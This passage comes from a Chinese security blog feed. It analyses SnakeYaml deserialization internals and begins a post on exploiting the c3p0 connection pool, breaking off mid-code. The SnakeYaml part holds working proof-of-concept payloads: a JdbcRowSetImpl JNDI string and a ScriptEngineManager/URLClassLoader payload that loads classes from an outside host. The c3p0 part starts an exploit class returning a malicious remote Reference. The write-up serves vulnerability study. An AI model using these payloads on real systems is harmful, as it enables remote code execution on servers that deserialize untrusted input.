src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232106.png" alt="image.png"></p><p>这里MappingNode的tag其实是<code>tag:yaml.org,2002:org.n4c1.unserial.Person</code>, 默认yaml是没有这个构造器的, 直接返回了一个 <code>&#123;Constructor$ConstructYamlObject@1306&#125; </code>构造器, 之后用这个构造器取还原类</p><p>这里会进入ConstructYamlObject这个构造器的consructor方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232718.png" alt="image.png"><br>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808235618.png" alt="image.png"></p><p>getClassForNode方法会反射获取我们节点的class<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808233130.png" alt="image.png"></p><p>调用的是这个方法, 传入类名, 返回类的class, 然后把class存在node的type属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808233300.png" alt="image.png"></p><p>之后回去看construct方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808235745.png" alt="image.png"><br>有一步<code>Constructor.this.newInstance(mnode)</code>, 这个newInstance方法是这个snakeYaml类自己实现的, 里面具体逻辑主要就是用刚刚反射得到的class,反射获取构造器, 实例出对象</p><p>之后这里的constructJavaBean2ndStep方法就是给对象的属性进行反序列化然后赋值, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809001832.png" alt="image.png"></p><p>首先flattenMapping对对象进行展平, 主要包括了<strong>处理重复的键</strong> 和 <strong>处理合并键（<code>&lt;&lt;</code>）</strong>。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809001920.png" alt="image.png"></p><p>先看processDuplicateKeys方法<br>这个实际上是实例出键, 利用tuple去重, 可以看见调用了constructObject来构建对象<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809002052.png" alt="image.png"><br>之后调用了对象的hashCode方法, </p><p>这里就出现了一个攻击面, hashCode方法可以触发到cc链等一些链子</p><p>后面的逻辑大概还是和去重有关, 不用管<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809002646.png" alt="image.png"><br>flattenMapping结束后回到constructJavaBean2ndStep方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructJavaBean2ndStep</span><span class="params">(MappingNode node, Object object)</span> &#123;  </span><br><span class="line">    flattenMapping(node);  </span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; beanType = node.getType();  </span><br><span class="line">    List&lt;NodeTuple&gt; nodeValue = node.getValue();  </span><br><span class="line">    <span class="keyword">for</span> (NodeTuple tuple : nodeValue) &#123;  </span><br><span class="line">        ScalarNode keyNode;  </span><br><span class="line">        <span class="keyword">if</span> (tuple.getKeyNode() <span class="keyword">instanceof</span> ScalarNode) &#123;  </span><br><span class="line">            <span class="comment">// key must be scalar  </span></span><br><span class="line">            keyNode = (ScalarNode) tuple.getKeyNode();  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(  </span><br><span class="line">                    <span class="string">&quot;Keys must be scalars but found: &quot;</span> + tuple.getKeyNode());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Node</span> <span class="variable">valueNode</span> <span class="operator">=</span> tuple.getValueNode();  </span><br><span class="line">        <span class="comment">// keys can only be Strings  </span></span><br><span class="line">        keyNode.setType(String.class);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> (String) constructObject(keyNode);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">TypeDescription</span> <span class="variable">memberDescription</span> <span class="operator">=</span> typeDefinitions.get(beanType);  </span><br><span class="line">            <span class="type">Property</span> <span class="variable">property</span> <span class="operator">=</span> memberDescription == <span class="literal">null</span> ? getProperty(beanType, key)  </span><br><span class="line">                    : memberDescription.getProperty(key);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (!property.isWritable()) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">YAMLException</span>(<span class="string">&quot;No writable property &#x27;&quot;</span> + key + <span class="string">&quot;&#x27; on class: &quot;</span>  </span><br><span class="line">                        + beanType.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            valueNode.setType(property.getType());  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">typeDetected</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)  </span><br><span class="line">                    ? memberDescription.setupPropertyType(key, valueNode)  </span><br><span class="line">                    : <span class="literal">false</span>;  </span><br><span class="line">            <span class="keyword">if</span> (!typeDetected &amp;&amp; valueNode.getNodeId() != NodeId.scalar) &#123;  </span><br><span class="line">                <span class="comment">// only if there is no explicit TypeDescription  </span></span><br><span class="line">                Class&lt;?&gt;[] arguments = property.getActualTypeArguments();  </span><br><span class="line">                <span class="keyword">if</span> (arguments != <span class="literal">null</span> &amp;&amp; arguments.length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                    <span class="comment">// type safe (generic) collection may contain the  </span></span><br><span class="line">                    <span class="comment">// proper class                    </span></span><br><span class="line">                    <span class="keyword">if</span> (valueNode.getNodeId() == NodeId.sequence) &#123;  </span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];  </span><br><span class="line">                        <span class="type">SequenceNode</span> <span class="variable">snode</span> <span class="operator">=</span> (SequenceNode) valueNode;  </span><br><span class="line">                        snode.setListType(t);  </span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Set.class.isAssignableFrom(valueNode.getType())) &#123;  </span><br><span class="line">                        Class&lt;?&gt; t = arguments[<span class="number">0</span>];  </span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;  </span><br><span class="line">                        mnode.setOnlyKeyType(t);  </span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);  </span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(valueNode.getType())) &#123;  </span><br><span class="line">                        Class&lt;?&gt; keyType = arguments[<span class="number">0</span>];  </span><br><span class="line">                        Class&lt;?&gt; valueType = arguments[<span class="number">1</span>];  </span><br><span class="line">                        <span class="type">MappingNode</span> <span class="variable">mnode</span> <span class="operator">=</span> (MappingNode) valueNode;  </span><br><span class="line">                        mnode.setTypes(keyType, valueType);  </span><br><span class="line">                        mnode.setUseClassConstructor(<span class="literal">true</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> (memberDescription != <span class="literal">null</span>)  </span><br><span class="line">                    ? newInstance(memberDescription, key, valueNode)  </span><br><span class="line">                    : constructObject(valueNode);  </span><br><span class="line">            <span class="comment">// Correct when the property expects float but double was  </span></span><br><span class="line">            <span class="comment">// constructed            </span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == Float.TYPE || property.getType() == Float.class) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Double) &#123;  </span><br><span class="line">                    value = ((Double) value).floatValue();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="comment">// Correct when the property a String but the value is binary  </span></span><br><span class="line">            <span class="keyword">if</span> (property.getType() == String.class &amp;&amp; Tag.BINARY.equals(valueNode.getTag())  </span><br><span class="line">                    &amp;&amp; value <span class="keyword">instanceof</span> <span class="type">byte</span>[]) &#123;  </span><br><span class="line">                value = <span class="keyword">new</span> <span class="title class_">String</span>((<span class="type">byte</span>[]) value);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (memberDescription == <span class="literal">null</span>  </span><br><span class="line">                    || !memberDescription.setProperty(object, key, value)) &#123;  </span><br><span class="line">                property.set(object, value);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (DuplicateKeyException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConstructorException</span>(  </span><br><span class="line">                    <span class="string">&quot;Cannot create property=&quot;</span> + key + <span class="string">&quot; for JavaBean=&quot;</span> + object,  </span><br><span class="line">                    node.getStartMark(), e.getMessage(), valueNode.getStartMark(), e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809004030.png" alt="image.png"></p><p>可以看见又使用constructObject对键进行了构造, 之后获取JavaBean的property, 把value构造出来放进去, 依然是使用constructObject方法<br>最后将value set进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809004548.png" alt="image.png"></p><p>两个问题</p><ol><li>property如何被获取的</li><li>property.set内部如何给属性赋值的</li></ol><p>这个property是org.yaml.snakeyaml.introspector.MethodProperty类型</p><p>set方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809010808.png" alt="image.png"><br>发现内部包装的是一个<code>PropertyDescriptor</code></p><p>跟进getWriteMethod方法, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809010930.png" alt="image.png"></p><p>this.writeMethodRef已经存在这个set方法</p><p>搜索this.writeMethodRef.set, 发现有setWriteMethod, 打上断点<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809011013.png" alt="image.png"></p><p>重新运行, 强制运行到此处, 可以看到调用栈是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setWriteMethod:<span class="number">321</span>, PropertyDescriptor (java.beans)</span><br><span class="line">&lt;init&gt;:<span class="number">161</span>, PropertyDescriptor (java.beans)</span><br><span class="line">getTargetPropertyInfo:<span class="number">522</span>, Introspector (java.beans)</span><br><span class="line">getBeanInfo:<span class="number">428</span>, Introspector (java.beans)</span><br><span class="line">getBeanInfo:<span class="number">173</span>, Introspector (java.beans)</span><br><span class="line">getPropertiesMap:<span class="number">83</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">152</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">148</span>, PropertyUtils (org.yaml.snakeyaml.introspector)</span><br><span class="line">getProperty:<span class="number">309</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructJavaBean2ndStep:<span class="number">230</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">171</span>, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">331</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">13</span>, testYaml (org.n4c1.unserial)</span><br></pre></td></tr></table></figure><p>可以看见是getProperty的时候就set了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809011328.png" alt="image.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><code>JdbcRowSetImpl</code></h3><p>JdbcRowSetImpl打jndi, 老把戏了, 就是调用setter<br>poc: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/pvscac, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809155555.png" alt="image.png"><br>具体流程有了之前的调试也很清楚了, 不必多说</p><h3 id="ScriptEngineManager-gadget"><a href="#ScriptEngineManager-gadget" class="headerlink" title="ScriptEngineManager gadget"></a>ScriptEngineManager gadget</h3><p>yaml反序列化时可以通过!!+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造ScriptEngineManagerpayload并利用[[SPI机制]]机制通过URLClassLoader或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p><p>[[SPI机制]]<br>Java 原生 SPI:</p><p>Java 从 6 版本开始提供了原生的 SPI 机制，它的实现方式相对简单和直接。</p><p><strong>工作流程</strong>：</p><ol><li><p><strong>定义服务接口</strong>：首先，你需要定义一个公共的服务接口（如 <code>com.example.Logger</code>）。</p></li><li><p><strong>提供服务实现</strong>：服务提供方创建该接口的具体实现类（如 <code>com.example.FileLogger</code>）。</p></li><li><p><strong>创建配置文件</strong>：在服务实现的 JAR 包的 <code>META-INF/services/</code> 目录下，创建一个以<strong>接口全限定名</strong>为名的文件。</p><ul><li><p>文件名：<code>com.example.Logger</code></p></li><li><p>文件内容：<code>com.example.FileLogger</code>（每行一个实现类名）</p></li></ul></li><li><p><strong>应用程序加载</strong>：应用程序在运行时，通过 <code>java.util.ServiceLoader</code> 来加载服务。<code>ServiceLoader</code> 会扫描 <code>META-INF/services/</code> 目录，找到对应的文件，然后通过反射加载文件里指定的实现类。</p></li></ol><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://f80226cf33.ipv6.1433.eu.org\&quot;]]]]\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>为什么使用<code>ScriptEngineManager</code>?<br>ScriptEngineManager这个类原本是用来在 Java 应用程序中<code>发现</code>、<code>实例化</code>和<code>管理</code>脚本引擎(Script Engine)的, 类似用于管理不同jdbc实现的<code>java.sql.DriverManager</code>类, 他们都是SPI机制中的一部分, 但在ScriptEngineManager这个类中, 直接加载构造器参数传来的类导致了这一利用产生</p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>我们找到这个类, 断点打在构造方法</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809230457.png" alt="image.png"><br>可以看见注释写的很清楚, 这个构造器会使用参数指定的类加载器来加载ScriptEngineFactory接口的实现, 知道这些其实就可以利用了, 后面的调用栈这里就不再记录了</p><p>对于恶意的实现, 参考项目<br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a><br>可以直接利用</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">SnakeYaml反序列化漏洞研究</a><br><a href="https://tttang.com/archive/1815/">SnakeYaml反序列化及不出网利用</a><br><a href="https://forum.butian.net/share/4486">SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SnakeYaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c3p0利用</title>
      <link href="/2025/09/10/c3p0%E5%88%A9%E7%94%A8/"/>
      <url>/2025/09/10/c3p0%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><h2 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h2><blockquote><p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。<br>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。  </p><p>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h2 id="URLClassLoader远程类加载"><a href="#URLClassLoader远程类加载" class="headerlink" title="URLClassLoader远程类加载"></a>URLClassLoader远程类加载</h2></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject -&gt; </span><br><span class="line">ReferenceSerialized.getObject -&gt; </span><br><span class="line">ReferenceableUtils.referenceToObject-&gt;</span><br><span class="line">fClass.newInstance()</span><br></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>入口在<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713143306.png" alt="image.png"></p><p>如上图, 如果反序列化得到的是<code>IndirectlySerialized</code>的实例, 则强制转为<code>IndirectlySerialized</code>类型并调用其<code>getObject</code>方法, 并将<code>getObject</code>返回的对象强制转换为<code>ConnectionPoolDataSource</code>类型</p><p>因此这过程其实是为了得到<code>this.connectionPoolDataSource</code>这个属性, 之所以有这样一个过程, 是因为<code>ConnectionPoolDataSource</code>本身是没有实现<code>Serializable</code>接口的, 无法直接反序列化</p><p>既然是通过<code>IndirectlySerialized.getObject</code>得来的, 那就去看这个接口的实现类</p><p>发现只有这一个实现类, 就是<code>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144444.png" alt="image.png"></p><p>那么基本可以断定一开始的<code>((IndirectlySerialized) o).getObject();</code>实际上就是调用的<code>ReferenceSerialized.getObject</code></p><p>可以在writeObject中看看序列化的过程是不是与此对应<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144851.png" alt="image.png"></p><p>可以看见先尝试直接序列化<code>connectionPoolDataSource</code>, 抛出错误时则捕获并实例一个<code>ReferenceIndirector</code>对<code>connectionPoolDataSource</code>进行包装再序列化</p><p>而<code>ReferenceIndirector</code>正是使用了其内部类<code>ReferenceSerialized</code>, <code>indirectForm</code>返回的是一个<code>ReferenceSerialized</code>对象</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713145150.png" alt="image.png"></p><p>所以序列化写入的也是<code>ReferenceSerialized</code>对象, 反序列化时自然读取的是<code>ReferenceSerialized</code>对象, 调用<code>ReferenceSerialized.getObject</code></p><p>所以第一段就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject -&gt; </span><br><span class="line">ReferenceSerialized.getObject -&gt; </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>再来看<code>ReferenceSerialized.getObject</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713144444.png" alt="image.png"></p><p>看其他师傅说<code>nameContext = (Context) initialContext.lookup( contextName );</code>这里是没法利用的, 因为<code>默认为null</code></p><p>那么就是看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return ReferenceableUtils.referenceToObject( reference, name, nameContext, env );</span><br></pre></td></tr></table></figure><p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713151146.png" alt="image.png"><br>直接是一个远程加载类<br>url是从</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br></pre></td></tr></table></figure><p>读取的</p><p>可以去看看<code>ref</code>的来源, 其实就是<code>connectionPoolDataSource</code>的引用</p><p>反序列化时:<br>从引用中尝试还原<code>connectionPoolDataSource</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713151405.png" alt="image.png"></p><p>序列化时:<br>获取引用进行序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713161709.png" alt="image.png"></p><p><code>orig</code>就是不可直接序列化的<code>connectionPoolDataSource</code>, 通过序列化其引用来完成</p><p>在这个过程中, 引用是完全可控的, 且反序列化时未进行校验, 导致漏洞产生</p><h3 id="构造利用连"><a href="#构造利用连" class="headerlink" title="构造利用连"></a>构造利用连</h3><p>由于序列化时传入的是一个引用, 和并不校验被引用的类, 因此可以自定义一个类反返回恶意的引用<br>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urlClassLoadExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXPLoader</span> <span class="keyword">implements</span> <span class="title class_">Referenceable</span>, ConnectionPoolDataSource &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span 